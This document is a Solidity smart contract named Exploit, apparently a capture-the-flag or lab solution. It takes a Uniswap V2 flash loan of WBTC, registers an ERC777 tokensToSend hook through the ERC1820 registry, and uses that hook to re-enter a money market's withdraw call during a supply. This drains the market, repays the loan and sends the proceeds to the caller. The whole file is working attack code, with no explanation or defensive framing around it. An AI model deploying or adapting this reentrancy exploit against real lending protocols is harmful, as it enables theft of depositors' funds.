// SPDX-License-Identifier: MIT
pragma solidity ^0.8.4;

import {IUniswapV2Pair} from "@uniswap/v2-core/contracts/interfaces/IUniswapV2Pair.sol";
import {IERC20} from "@openzeppelin/contracts/token/ERC20/IERC20.sol";
import {IMoneyMarket} from "./IMoneyMarket.sol";
import {IERC1820Registry} from "@openzeppelin/contracts/utils/introspection/IERC1820Registry.sol";

contract Exploit {
    IUniswapV2Pair private usdcBtcPair;
    IERC20 private wbtc;
    IMoneyMarket private moneyMarket;
    bool private withdraw;

    constructor(address _usdcBtcPair, address _wbtc, address _moneyMarket) {
        usdcBtcPair = IUniswapV2Pair(_usdcBtcPair);
        wbtc = IERC20(_wbtc);
        moneyMarket = IMoneyMarket(_moneyMarket);
        wbtc.approve(_moneyMarket, type(uint256).max);
        IERC1820Registry(0x1820a4B7618BdE71Dce8cdc73aAB6C95905faD24).setInterfaceImplementer(
            address(this), 
            keccak256("ERC777TokensSender"),
            address(this)
        );
    }

    function start() external {
        bool t0 = usdcBtcPair.token0() == address(wbtc);
        if (t0) {
            usdcBtcPair.swap(1999e18, 0, address(this), new bytes(0x1));
        } else {
            usdcBtcPair.swap(0, 1999e18, address(this), new bytes(0x1));
        }
        wbtc.transfer(msg.sender, wbtc.balanceOf(address(this)));
    }

    function uniswapV2Call(address sender, uint amount0, uint amount1, bytes calldata data) external {
        require(msg.sender == address(usdcBtcPair), "invalid sender");
        uint256 usdcAmount = wbtc.balanceOf(address(this));
        moneyMarket.supply(address(wbtc), 999e18);
        withdraw = true;
        moneyMarket.supply(address(wbtc), 1000e18);
        moneyMarket.withdraw(address(wbtc), type(uint256).max);
        //repay flashloan
        wbtc.transfer(address(usdcBtcPair), usdcAmount * 1000 / 997 + 1);
    }

    function tokensToSend(
        address operator,
        address from,
        address to,
        uint256 amount,
        bytes calldata userData,
        bytes calldata operatorData
    ) external {
        if (msg.sender == address(wbtc) && withdraw) {
            withdraw = false;
            moneyMarket.withdraw(address(wbtc), type(uint256).max);
        }
    }
}